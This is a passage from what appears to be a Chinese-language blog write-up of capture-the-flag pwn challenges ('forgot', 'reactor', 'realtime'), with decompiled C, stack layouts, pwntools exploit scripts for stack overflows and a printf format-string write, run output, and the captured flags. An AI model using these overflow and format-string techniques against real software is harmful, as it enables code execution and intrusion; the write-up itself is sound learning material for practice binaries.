<span class="number">8</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">if</span> ( sub_8048784(v2[i]) )</span><br><span class="line">          v5 = <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">        v5 = <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))v3[--v5])();<span class="comment">//使用函数指针调用函数,显然要通过该函数指针执行sub_80486CC函数</span></span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>循环中出现过的三个判断函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">sub_8048702</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span> || a1 &gt; <span class="number">47</span> &amp;&amp; a1 &lt;= <span class="number">57</span> || a1 == <span class="number">95</span> || a1 == <span class="number">45</span> || a1 == <span class="number">43</span> || a1 == <span class="number">46</span>;</span><br><span class="line">    <span class="comment">//a1是小写字母或者阿拉伯数字或者[  -  +  .其中之一就返回true,否则false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">sub_804874C</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span> || a1 &gt; <span class="number">47</span> &amp;&amp; a1 &lt;= <span class="number">57</span> || a1 == <span class="number">95</span>;</span><br><span class="line">    <span class="comment">//a1是小写字母或者阿拉伯数字或者[ 其中之一就返回true,否则false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_BOOL4 __cdecl <span class="title function_">sub_8048784</span><span class="params">(<span class="type">char</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span>;</span><br><span class="line">     <span class="comment">//a1是小写字母就返回true,否则false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="main栈帧"><a href="#main栈帧" class="headerlink" title="main栈帧"></a>main栈帧</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-00000074 v2              db 32 dup(?)</span><br><span class="line">-00000054 v3              db 40 dup(?)</span><br><span class="line">-0000002C s               db 32 dup(?)            ; string(C)</span><br><span class="line">-0000000C v5              dd ?</span><br><span class="line">-00000008 i               dd ?</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>
-
-<p>v2在栈底,其上的所有东西都可以溢出</p>
-<p>v3就是函数指针那一伙子数组</p>
-<p>在<code>((void (*)(void))v3[--v5])();</code>这里,v5会经过前面的一系列循环判断被修改.</p>
-<p>我们的想法是,将<code>0x80486CC</code>溢出到<code>v3[0]</code>这么一个固定地址,方便最后的<code>((void (*)(void))v3[--v5])();</code>执行它</p>
-<p>那么还需要保证v5一开始为1(这个程序一开始设定好了)并且后来一直不被改变.</p>
-<p>但是有个规律是,只有循环中三个判断函数返回true时v5才会被修改,如果判断函数都返回false则显然v5不会被修改.</p>
-<p>又这三个判断函数只会对 a1是小写字母或者阿拉伯数字或者[  -  +  .这几种情况返回true,那么如果能够将<code>v2[i]</code>溢出成除了这些字符之外的字符就可以绕过判断,保证v5&#x3D;1,如此最终出循环的时候,<code>((void (*)(void))v3[--v5])();</code>就相当于<code>((void (*)(void))v3[0])();</code>,执行固定的函数</p>
-<p>现在问题转化为如何保证v2数组满足上述条件,显然v2就是我们要输入的,这个自然可以满足,输入32个问号?或者32个大写字母均可</p>
-<p>还要解决的是溢出<code>v3[0]</code>的问题</p>
-<p><code>v3[0]</code>是一个四字32位,并且v3紧挨着v2,显然当v2写满了,紧接着就溢出v3了</p>
-<p>因此exp可以这样写</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./forgot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;vader&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">&#x27;A&#x27;</span>*<span class="number">32</span>).encode()+p32(<span class="number">0x080486cc</span>)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>或者,反正v5总是落在1到10范围内,最后<code>((void (*)(void))v3[--v5])();</code>反正是执行的v3函数指针数组的其中一项,那么直接把v3数组的每一项都溢出成<code>0x80486CC</code>,这样就不用关心v5的值是多少了,也就是不用绕过判断函数了</p>
-<p>因此exp还可以这样写:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./forgot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">sh.sendline(<span class="string">&#x27;vader&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">&#x27;?&#x27;</span>*<span class="number">32</span>).encode()+p32(<span class="number">0x080486cc</span>)*<span class="number">10</span>  <span class="comment">#由于不用关心v5,因此v2数组也不用关心了</span></span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p>最终得到flag</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/<span class="number">86135</span>/Desktop/pwn/forgot]</span><br><span class="line">└─$ python3 exp.py</span><br><span class="line">[+] Opening connection to <span class="number">111.200</span><span class="number">.241</span><span class="number">.244</span> on port <span class="number">51086</span>: Done</span><br><span class="line">/mnt/c/Users/<span class="number">86135</span>/Desktop/pwn/forgot/exp.py:<span class="number">23</span>: BytesWarning: Text <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">bytes</span>; assuming ASCII, no guarantees. See https://docs.pwntools.com/<span class="comment">#bytes</span></span><br><span class="line">  sh.sendline(<span class="string">&#x27;vader&#x27;</span>)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">I should give you a pointer perhaps. Here: <span class="number">8048654</span></span><br><span class="line"></span><br><span class="line">Enter the string to be validate</span><br><span class="line">&gt; cyberpeace&#123;4edfc4922cff2900b97255284e605051&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="错误想法"><a href="#错误想法" class="headerlink" title="错误想法"></a>错误想法</h3><h4 id="错误1"><a href="#错误1" class="headerlink" title="错误1"></a>错误1</h4><p>在循环伊始</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  v0 = i;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt;= <span class="built_in">strlen</span>(v2) )</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>
-
-<p>首先用<code>v0=i</code>然后让v0和<code>strlen(v2)</code>作比较,如果v0很大则直接跳过循环</p>
-<p>我一开始想用溢出v0跳过循环保持v5&#x3D;1不变</p>
-<p>由于<code>v0=i</code>因此我想让i溢出成很大的值然后v0获得其拷贝也是个大数</p>
-<p>于是得到了这样的payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=(&#x27;a&#x27;*32).encode()+p32(0x080486cc)+(&#x27;a&#x27;*0x48).encode()+p32(0x7fffffff)</span><br></pre></td></tr></table></figure>
-
-<p>前32个字符随便写填满v2,反正不会进入循环</p>
-<p>然后v3的第一个四字溢出成<code>0x80486cc</code>这个函数地址</p>
-<p>然后<code>[ebp-0x50,ebp-0x8)</code>这78个字符都随便溢出,</p>
-<p>然后i溢出成最大正数<code>0x7fffffff</code></p>
-<p>结果这样打不通</p>
-<p>原因是,<code> for ( i = 0; ; ++i )</code>在循环一开始 的时候有一个<code>i=0</code>这个是在代码段里的,这打死也改不了</p>
-<p>也就是在执行到这里的时候,我们的payload变成了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=(&#x27;a&#x27;*32).encode()+p32(0x080486cc)+(&#x27;a&#x27;*0x48).encode()+p32(0x0)</span><br></pre></td></tr></table></figure>
-
-<p>i改了也白改,因为v2获取输入发生在循环之前,进入循环的时候又要i&#x3D;0初始化循环变量</p>
-<h4 id="错误2"><a href="#错误2" class="headerlink" title="错误2"></a>错误2</h4><p>那么此时把前32个字符改成’A’企图用老方法绕过每次判断函数还可以吗?也不行</p>
-<p>因为<code>(&#39;a&#39;*0x48)</code>这里我们已经把v5溢出成<code>a</code>(ascii码为97)了,最后出了循环的时候执行的是<code>((void (*)(void))v3[96])();</code>显然这对于v3指针数组来说已经访问越界了</p>
-<h4 id="错误3"><a href="#错误3" class="headerlink" title="错误3"></a>错误3</h4><p>直接不管main函数的所有逻辑,溢出main的返回地址,改成<code>0x80486cc</code>可以吗</p>
-<p>即payload这样写:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x78</span>).encode()+p32(<span class="number">0x80486CC</span>)</span><br></pre></td></tr></table></figure>
-
-<p>前面<code>0x78</code>个字节啥也不管全都乱写,最后返回地址r溢出成<code>0x80486CC</code></p>
-<p>这样写也不行,因为中间将<code>v3</code>那个指针数组溢出毁了,所有的指针都指向<code>0x97</code>这个位置,而这个位置显然不在程序的虚拟地址空间里面(本程序的虚拟地址空间从<code>0x08048000</code>开始).这个位置指的是谁呢?我反正不知道,也不想知道.反正发生了段错误.还没等到main函数返回时程序就因为段错误结束运行了</p>
-<h2 id="反应釜开关控制"><a href="#反应釜开关控制" class="headerlink" title="反应釜开关控制"></a>反应釜开关控制</h2><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220619233350713.png" alt="image-20220619233350713"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\pwn\reactor&gt; checksec reactor      [*] <span class="string">&#x27;C:\\Users\\86135\\Desktop\\pwn\\reactor\\reactor&#x27;</span>           Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>有一个shell函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>但是没有调用者,需要溢出主函数的返回地址,改成shell的地址<code>4005F6</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-240h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">512</span>]; <span class="comment">// [rsp+40h] [rbp-200h] BYREF</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Please closing the reaction kettle\n&quot;</span>, <span class="number">0x23</span>uLL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;The switch is:&quot;</span>, <span class="number">0xE</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, easy);</span><br><span class="line">  write(<span class="number">1</span>, s, <span class="number">9uLL</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">2uLL</span>);</span><br><span class="line">  gets(v5);<span class="comment">//此处存在栈缓冲区溢出攻击</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>main函数栈帧</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000200 v5              db 512 dup(?)</span><br><span class="line">+0000000000000000  s              db 8 dup(?)</span><br><span class="line">+0000000000000008  r              db 8 dup(?)</span><br><span class="line">+0000000000000010</span><br><span class="line">+0000000000000010 ; end of stack variables</span><br></pre></td></tr></table></figure>
-
-<p>前512+8&#x3D;520个字节随便溢出</p>
-<p>后面八个字节溢出成shell函数的地址<code>0x4005F6</code></p>
-<p>属实有点儿弱智了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./reactor&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line">payload=(<span class="number">520</span>*<span class="string">&#x27;a&#x27;</span>).encode()+p64(<span class="number">0x4005f6</span>);</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/reactor]</span><br><span class="line">└─$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./reactor&#x27;</span>: pid 44                                                                                                                                    </span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">kali</span><br></pre></td></tr></table></figure>
-
-<p><code>cyberpeace&#123;a6053fab9ffe26d2ddc53ce7f78e08be&#125;</code></p>
-<h2 id="实时数据监测"><a href="#实时数据监测" class="headerlink" title="实时数据监测"></a>实时数据监测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/realtime]</span><br><span class="line">└─$ checksec realtime</span><br><span class="line">[*] <span class="string">&#x27;/mnt/c/Users/86135/Desktop/pwn/realtime/realtime&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
-
-
-
-<p>主函数只调用了一共<code>locker</code>函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">locker</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">520</span>]; <span class="comment">// [esp+0h] [ebp-208h] BYREF</span></span><br><span class="line"></span><br><span class="line">  fgets(s, <span class="number">512</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  imagemagic(s);</span><br><span class="line">  <span class="keyword">if</span> ( key == <span class="number">35795746</span> )<span class="comment">//如果key=3579576=0x2223322,看来需要溢出改变</span></span><br><span class="line">    result = system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="built_in">printf</span>(format, &amp;key, key);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>关键函数在<code>  imagemagic(s);</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">imagemagic</span><span class="params">(<span class="type">char</span> *format)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(format);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>存在<code>printf</code>格式化字符串漏洞,<code>format</code>来自<code>locker</code>中的<code>s,s</code>来自<code>stdin</code>键盘输入,长度<code>512</code>个字节,足够写入负载了</p>
-<p>首先要确定<code>printf</code>时,格式化字符串参数在栈上什么地方</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./realtime&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=(<span class="string">&quot;AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p&quot;</span>).encode()</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn/realtime]</span><br><span class="line">└─$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./realtime&#x27;</span>: pid 77                                                                                                                                   </span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Process <span class="string">&#x27;./realtime&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 77)</span><br><span class="line">AAAA-0xf7f5ace0-0xff8a6a84-(nil)-0x1-0x80483a0-0xff8a6a28-0x80484e7-0xff8a6820-0x200-0xf7f2b580-(nil)-0x41414141-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d</span><br><span class="line">The location of key is 0804a048, and its value is 00000000,not the 0x02223322. (╯°Д°)╯︵ ┻━┻</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
-
-<p><code>0x41414141</code>是栈上第12个参数,现在可以用key的地址<code>0x804A048</code>替代<code>AAAA</code>,然后用<code>payload=p32(0x0804A048)+(&#39;%035795742c%12$n&#39;).encode()</code>将<code>4+035795742</code>写到第12个参数上</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&quot;./realtime&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x0804A048</span>)+(<span class="string">&#x27;%035795742c%16$n&#x27;</span>).encode()</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<p>运行之后终端上会输出<code>035795746</code>个空格,需要等好长好长时间,才轮到我们与终端交互</p>
-<p>有没有温柔一些的方法呢?</p>
 
       
     </div>
